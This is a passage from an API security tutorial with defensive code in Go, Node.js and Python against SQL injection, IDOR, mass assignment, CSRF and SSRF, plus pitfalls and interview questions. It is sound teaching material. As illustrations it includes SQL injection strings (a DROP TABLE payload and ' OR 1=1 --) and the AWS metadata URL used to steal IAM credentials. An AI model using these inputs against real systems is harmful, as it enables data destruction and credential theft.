func loginHandler(w http.ResponseWriter, r *http.Request) {
    var req LoginRequest
    json.NewDecoder(r.Body).Decode(&req)

    user, err := userRepo.GetByEmail(r.Context(), req.Email)
    if err != nil {
        // Constant-time response — don't reveal whether email exists
        bcrypt.CompareHashAndPassword([]byte("$2b$12$dummyhashtopreventtiming"), []byte(req.Password))
        http.Error(w, "Invalid credentials", http.StatusUnauthorized)
        return
    }

    // bcrypt.CompareHashAndPassword is constant-time — prevents timing attacks
    if err := bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(req.Password)); err != nil {
        recordFailedLogin(user.ID)
        http.Error(w, "Invalid credentials", http.StatusUnauthorized)
        return
    }

    clearFailedLogins(user.ID)
    // issue session token...
}

// ─── SQL Injection Prevention ─────────────────────────────────────────────────

func searchUsersHandler(w http.ResponseWriter, r *http.Request) {
    query := r.URL.Query().Get("q")

    // NEVER: "SELECT ... WHERE name LIKE '%" + query + "%'"
    // ALWAYS: parameterized
    rows, err := db.QueryContext(r.Context(),
        "SELECT id, name, email FROM users WHERE name ILIKE $1 LIMIT 20",
        "%"+query+"%", // Safe — driver handles escaping
    )
    if err != nil {
        http.Error(w, "Internal error", http.StatusInternalServerError)
        return
    }
    defer rows.Close()
    // ...
}

// ─── Security Headers ─────────────────────────────────────────────────────────

func SecurityHeadersMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        h := w.Header()
        h.Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
        h.Set("X-Content-Type-Options", "nosniff")
        h.Set("X-Frame-Options", "DENY")
        h.Set("Content-Security-Policy", "default-src 'self'; frame-ancestors 'none'")
        h.Set("Referrer-Policy", "strict-origin-when-cross-origin")
        h.Del("Server")
        next.ServeHTTP(w, r)
    })
}
```

---

### Node.js + Express

```javascript
const express = require('express');
const bcrypt = require('bcrypt');
const { body, validationResult } = require('express-validator');
const helmet = require('helmet'); // Security headers

const app = express();
app.use(express.json({ limit: '100kb' }));

// Security headers via helmet
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            objectSrc: ["'none'"],
            frameAncestors: ["'none'"],
        },
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true,
    },
}));

// ─── IDOR Prevention ─────────────────────────────────────────────────────────

app.get('/orders/:id', authenticate, async (req, res) => {
    // Scope query to current user — ownership enforced at DB level
    const order = await db.query(
        'SELECT * FROM orders WHERE id = $1 AND user_id = $2',
        [req.params.id, req.user.id]
    );

    if (!order.rows.length) {
        return res.status(404).json({ error: 'Not found' }); // Never 403
    }

    res.json(order.rows[0]);
});

// ─── Mass Assignment Prevention ──────────────────────────────────────────────

app.post('/users',
    body('name').isString().trim().isLength({ min: 2, max: 100 }),
    body('email').isEmail().normalizeEmail(),
    body('password').isLength({ min: 8 }),
    async (req, res) => {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }

        const { name, email, password } = req.body; // Destructure only allowed fields
        // role, isAdmin, etc. are NOT extracted — mass assignment impossible

        const passwordHash = await bcrypt.hash(password, 12);

        const user = await db.query(
            'INSERT INTO users (name, email, password_hash, role) VALUES ($1, $2, $3, $4) RETURNING id, name, email, created_at',
            [name, email, passwordHash, 'user']
        );

        // Return only safe fields — never include password_hash
        res.status(201).json(user.rows[0]);
    }
);

// ─── SQL Injection Prevention ─────────────────────────────────────────────────

app.get('/users/search', authenticate, async (req, res) => {
    const { q } = req.query;

    // Parameterized — safe
    const results = await db.query(
        'SELECT id, name, email FROM users WHERE name ILIKE $1 LIMIT 20',
        [`%${q}%`] // String interpolation into parameter array is SAFE
        // The % are wildcards for LIKE, not SQL syntax — they're inside the parameter
    );

    // NEVER: db.query(`SELECT ... WHERE name LIKE '%${q}%'`)

    res.json(results.rows);
});

// ─── CSRF Prevention ─────────────────────────────────────────────────────────

// For cookie-based sessions, add CSRF protection
const csrf = require('csurf');
app.use(csrf({ cookie: { httpOnly: true, secure: true, sameSite: 'strict' } }));

app.get('/csrf-token', (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
});
```

---

### Python + FastAPI

```python
from fastapi import FastAPI, HTTPException, Depends, Request, Response
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from pydantic import BaseModel, EmailStr, validator
from passlib.context import CryptContext
from sqlalchemy.orm import Session
from typing import Optional
import bleach

app = FastAPI()

# Password hashing — argon2 via passlib
pwd_context = CryptContext(
    schemes=["argon2"],
    deprecated="auto",
    argon2__memory_cost=65536,  # 64MB
    argon2__time_cost=3,
    argon2__parallelism=4,
)

# ─── Request / Response Schemas ───────────────────────────────────────────────

class CreateUserRequest(BaseModel):
    name: str
    email: EmailStr
    password: str
    # NO: role, is_admin, internal_score

    @validator('name')
    def name_must_be_valid(cls, v):
        if len(v) < 2 or len(v) > 100:
            raise ValueError('Name must be 2-100 characters')
        return v.strip()

    @validator('password')
    def password_must_be_strong(cls, v):
        if len(v) < 8:
            raise ValueError('Password must be at least 8 characters')
        return v

class UserResponse(BaseModel):
    id: str
    name: str
    email: str
    created_at: datetime
    # NO: password_hash, stripe_customer_id, role, is_banned

    class Config:
        orm_mode = True

# ─── Security Headers Middleware ──────────────────────────────────────────────

@app.middleware("http")
async def security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Content-Security-Policy"] = "default-src 'self'; frame-ancestors 'none'"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers.pop("server", None)  # Remove server fingerprinting
    return response

# ─── Routes ──────────────────────────────────────────────────────────────────

@app.post("/users", response_model=UserResponse, status_code=201)
async def create_user(request: CreateUserRequest, db: Session = Depends(get_db)):
    # Hash password with argon2id
    password_hash = pwd_context.hash(request.password)

    user = User(
        name=request.name,
        email=request.email,
        password_hash=password_hash,
        role="user",  # Always set by server
    )
    db.add(user)
    db.commit()
    db.refresh(user)
    return user  # FastAPI uses response_model=UserResponse to filter fields

@app.get("/orders/{order_id}", response_model=OrderResponse)
async def get_order(
    order_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    # Ownership enforced at query level — IDOR prevention
    order = (
        db.query(Order)
        .filter(Order.id == order_id, Order.user_id == current_user.id)
        .first()
    )
    if not order:
        raise HTTPException(status_code=404, detail="Not found")  # Always 404
    return order

@app.post("/login")
async def login(request: LoginRequest, db: Session = Depends(get_db)):
    user = db.query(User).filter(User.email == request.email).first()

    if not user:
        # Always hash to prevent timing attacks — constant time
        pwd_context.verify(request.password, "$argon2id$v=19$m=65536,t=3,p=4$dummy$dummy")
        raise HTTPException(status_code=401, detail="Invalid credentials")

    if not pwd_context.verify(request.password, user.password_hash):
        raise HTTPException(status_code=401, detail="Invalid credentials")

    # Issue JWT or session token
    token = create_access_token(user.id)
    return {"access_token": token, "token_type": "bearer"}

# ─── SSRF Prevention ─────────────────────────────────────────────────────────

import ipaddress
from urllib.parse import urlparse
import httpx

ALLOWED_DOMAINS = {"images.yourcdn.com", "uploads.yourdomain.com"}
PRIVATE_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),  # AWS metadata
]

def validate_url_for_fetch(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme != "https":
        raise ValueError("Only HTTPS URLs allowed")
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain not allowed: {parsed.hostname}")
    import socket
    for addr_info in socket.getaddrinfo(parsed.hostname, None):
        ip = ipaddress.ip_address(addr_info[4][0])
        for private_range in PRIVATE_RANGES:
            if ip in private_range:
                raise ValueError(f"IP in private range: {ip}")
```

---

## 17. Common Patterns & Best Practices

### 1. Defense in Depth

No single security control is sufficient. Apply multiple layers:

```
Layer 1: Input validation (reject malformed data early)
Layer 2: Authentication (who are you?)
Layer 3: Authorization (can you do this?)
Layer 4: Object-level authorization (do you own this specific resource?)
Layer 5: Output encoding (prevent XSS in responses)
Layer 6: Security headers (browser-level protections)
Layer 7: Rate limiting (prevent abuse)
Layer 8: Logging and monitoring (detect attacks)
```

### 2. Principle of Least Privilege

```
Database user for application: SELECT, INSERT, UPDATE, DELETE on app tables only.
NOT: DROP TABLE, CREATE TABLE, all tables, pg_catalog

Service accounts: only permissions needed for their function.
API keys: scoped to specific operations.
```

### 3. Fail Secure — Default Deny

```go
// Wrong: default allow, explicitly deny
func canAccess(user *User, resource *Resource) bool {
    if user.Role == "banned" { return false }
    if resource.IsDeleted { return false }
    return true // Default: allow — dangerous
}

// Correct: default deny, explicitly allow
func canAccess(user *User, resource *Resource) bool {
    if user.Role == "admin" { return true }
    if resource.UserID == user.ID { return true }
    return false // Default: deny — secure
}
```

### 4. Security Testing in CI/CD

```yaml
# Add to CI pipeline
- name: SAST (Static Analysis)
  run: gosec ./...  # Go
  # or: npm audit, bandit (Python), semgrep

- name: Dependency scanning
  run: trivy fs .  # Scan for known vulnerabilities in dependencies

- name: Secret scanning
  run: trufflehog git file://. --only-verified
```

---

## 18. Common Pitfalls

### Pitfall 1: Checking Role, Not Ownership

```go
// Wrong — checks role but not object ownership
// Admin can access any order, but "user" has no additional check
func getOrderHandler(w http.ResponseWriter, r *http.Request) {
    order, _ := db.GetOrder(ctx, orderID)
    if user.Role != "admin" {
        // Falls through — any authenticated user can see any order!
    }
    json.NewEncoder(w).Encode(order)
}

// Correct — always check ownership
order, _ := db.GetOrderByIDAndUserID(ctx, orderID, user.ID)
```

### Pitfall 2: Using User-Controlled Data in SQL (Even "Safely")

```go
// Thinking you've sanitized but haven't
sortField := r.URL.Query().Get("sort") // User input
query := "SELECT * FROM orders ORDER BY " + sortField + " DESC"
// User sends: "sort=1; DROP TABLE orders; --"
// Parameterized queries don't protect ORDER BY clauses — use a whitelist

// Correct
allowedSorts := map[string]string{
    "date": "created_at", "amount": "total_amount", "status": "status",
}
col, ok := allowedSorts[sortField]
if !ok { col = "created_at" }
query := "SELECT * FROM orders ORDER BY " + col + " DESC"
// col is now from a whitelist, not user input
```

### Pitfall 3: Returning 403 Instead of 404 for Unauthorized Resources

```
403 Forbidden → confirms resource exists, you just can't access it
404 Not Found → ambiguous: might not exist, might be unauthorized

Return 404 always for ownership violations — don't leak existence
```

### Pitfall 4: Storing Passwords as SHA-256

```python
# WRONG
import hashlib
password_hash = hashlib.sha256(password.encode()).hexdigest()
# SHA-256 is fast, not a password hash

# CORRECT
from passlib.context import CryptContext
pwd_context = CryptContext(schemes=["argon2"], deprecated="auto")
password_hash = pwd_context.hash(password)
```

### Pitfall 5: Not Using Constant-Time Comparison for Secrets

```go
// Wrong — vulnerable to timing attack
if storedToken == providedToken {

// Correct — constant-time comparison
import "crypto/subtle"
if subtle.ConstantTimeCompare([]byte(storedToken), []byte(providedToken)) == 1 {
```

---

## 19. Interview Questions

**Q1: What is IDOR and how do you prevent it?**

IDOR (Insecure Direct Object Reference), also called BOLA, is when an API endpoint takes an object ID but doesn't verify the requesting user owns or has permission to access that specific object. Prevention: always include the user's ID in database queries to scope results (e.g., `WHERE id = $1 AND user_id = $2`), and return 404 (not 403) for unauthorized access to avoid confirming the resource exists.

**Q2: What is SSRF? Give a real example.**

SSRF (Server-Side Request Forgery) is when an attacker tricks your server into making HTTP requests to arbitrary URLs, including internal services. Example: a "fetch image from URL" endpoint where an attacker sends `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — your server fetches this AWS metadata service and returns the instance's IAM credentials. Prevention: use a strict allowlist of permitted domains and block all private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x) by resolving DNS and checking the resulting IPs.

**Q3: Why should you use bcrypt/argon2 for passwords instead of SHA-256?**

SHA-256 is designed to be fast — GPUs can compute ~10 billion SHA-256 hashes per second, making brute-force attacks trivial. bcrypt and argon2 are deliberately slow (key stretching) — bcrypt with work factor 12 takes ~250ms per hash, reducing GPU attack speed to ~10,000 hashes/sec. Argon2 additionally requires large amounts of memory (64MB), making GPU/ASIC attacks expensive. The slowness is the security property. Argon2id is the current best practice.

**Q4: What is mass assignment and how do you prevent it?**

Mass assignment is when a request body is passed directly to an ORM or database call without filtering, allowing users to set fields they shouldn't control (e.g., sending `{"role":"admin"}` to set themselves as admin). Prevention: use explicit request schemas (Pydantic models, Go structs) that only include user-settable fields, and never pass `request.body` directly to `Model.create()`. Map allowed fields explicitly.

**Q5: What is a SQL injection? Show an example and the fix.**

SQL injection is when unsanitized user input is embedded in a SQL query, allowing attackers to alter the query's logic. Example: `query = "SELECT * FROM users WHERE email = '" + email + "'"` — with email `' OR 1=1 --`, the query becomes `WHERE email = '' OR 1=1 --'` which returns all users. Fix: always use parameterized queries where the SQL template and values are sent separately to the database: `db.Query("SELECT * FROM users WHERE email = $1", email)`. The DB parses the SQL template first, so user input is always treated as a value, never as SQL syntax.

**Q6: What is CSRF and how do SameSite cookies prevent it?**

CSRF tricks a user's browser into making unintended requests to a site they're logged into, by exploiting the browser's automatic cookie inclusion. SameSite=Strict prevents cookies from being sent in any cross-site request — a form on evil.com cannot include your bank's session cookie, breaking the attack. SameSite=Lax prevents cookies on sub-resource requests (fetch/XHR/form POST) but allows them on top-level navigations. Most CSRF attacks are form submissions or XHR, so Lax breaks the majority of CSRF attacks.

---

## 20. Resources

- [OWASP API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x00-header/) — Official OWASP API Security guide
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Argon2 Password Hashing](https://github.com/P-H-C/phc-winner-argon2) — Reference implementation and parameters guide
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free, hands-on labs for every vulnerability type
- [SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Mozilla Security Headers Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#security) — Every security header explained
- [securityheaders.com](https://securityheaders.com/) — Check your site's security headers

---

**Next:** [Part 14.2: Rate Limiting, DDoS Protection & Secrets Management](./14-rate-limiting-secrets.md)
